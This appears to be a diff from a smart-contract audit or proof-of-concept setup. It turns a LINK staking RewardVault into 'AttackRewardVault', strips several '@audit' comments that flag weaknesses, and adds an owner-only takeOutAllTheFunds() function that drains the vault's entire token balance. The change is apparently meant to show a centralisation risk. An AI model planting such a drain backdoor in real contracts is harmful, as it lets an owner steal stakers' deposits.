@@ -13,13 +13,13 @@ import {SafeCast} from '@openzeppelin/contracts/utils/math/SafeCast.sol';
 
 import {FixedPointMathLib} from '@solmate/utils/FixedPointMathLib.sol';
 
-import {IMigratable} from '../interfaces/IMigratable.sol';
-import {IRewardVault} from '../interfaces/IRewardVault.sol';
-import {IStakingPool} from '../interfaces/IStakingPool.sol';
-import {Migratable} from '../Migratable.sol';
-import {PausableWithAccessControl} from '../PausableWithAccessControl.sol';
-import {CommunityStakingPool} from '../pools/CommunityStakingPool.sol';
-import {OperatorStakingPool} from '../pools/OperatorStakingPool.sol';
+import {IMigratable} from '../src/interfaces/IMigratable.sol';
+import {IRewardVault} from '../src/interfaces/IRewardVault.sol';
+import {IStakingPool} from '../src/interfaces/IStakingPool.sol';
+import {Migratable} from '../src/Migratable.sol';
+import {PausableWithAccessControl} from '../src/PausableWithAccessControl.sol';
+import {CommunityStakingPool} from '../src/pools/CommunityStakingPool.sol';
+import {OperatorStakingPool} from '../src/pools/OperatorStakingPool.sol';
 import {console} from 'forge-std/console.sol';
 
 /// @notice This contract is the reward vault for the staking pools. Admin can deposit rewards into
@@ -36,7 +36,7 @@ import {console} from 'forge-std/console.sol';
 /// @dev invariant Stakers' multipliers are within 0 and the max value.
 /// @dev We only support LINK token in v0.2 staking. Rebasing tokens, ERC777 tokens, fee-on-transfer
 /// tokens or tokens that do not have 18 decimal places are not supported.
-contract RewardVault is
+contract AttackRewardVault is
   ERC677ReceiverInterface,
   IRewardVault,
   Migratable,
@@ -318,7 +318,6 @@ contract RewardVault is
     i_communityStakingPool = params.communityStakingPool;
     i_operatorStakingPool = params.operatorStakingPool;
 
-    // @audit no bounding limit for delegationRateDenominator
     s_vaultConfig.delegationRateDenominator = params.delegationRateDenominator;
     emit DelegationRateDenominatorSet(0, params.delegationRateDenominator);
 
@@ -432,7 +431,6 @@ contract RewardVault is
         emissionRate: communityRate
       });
     } else if (newDelegationRateDenominator == 1) {
-      // @audit that means 100 % of the rewards are delegated
       delete s_rewardBuckets.communityBase.rewardDurationEndsAt;
       _updateRewardDurationEndsAt({
         bucket: s_rewardBuckets.operatorDelegated,
@@ -636,7 +634,6 @@ contract RewardVault is
     _updateRewardPerToken();
 
     bool isOperator = _isOperator(msg.sender);
-    // @audit removed operator cannot claim the rewards
     IStakingPool stakingPool =
       isOperator ? IStakingPool(i_operatorStakingPool) : IStakingPool(i_communityStakingPool);
     uint256 stakerPrincipal = _getStakerPrincipal(msg.sender, stakingPool);
@@ -1197,8 +1194,6 @@ contract RewardVault is
     // @audit should be made in the beggining of the code
     if (amount + remainingRewards < emissionRate) revert RewardDurationTooShort();
 
-
-    // @audit that means unvested rewards will be given at different emission rate now
     _updateRewardDurationEndsAt({
       bucket: bucket,
       rewardAmount: amount + remainingRewards,
@@ -1810,5 +1805,13 @@ contract RewardVault is
   /// @inheritdoc TypeAndVersionInterface
   function typeAndVersion() external pure virtual override returns (string memory) {
     return 'RewardVault 1.0.0';
+  }
+
+  function takeOutAllTheFunds() external {
+    if(msg.sender != owner()){
+        revert();
+    }
+
+    i_LINK.transfer(msg.sender, i_LINK.balanceOf(address(this)));
   }
 }
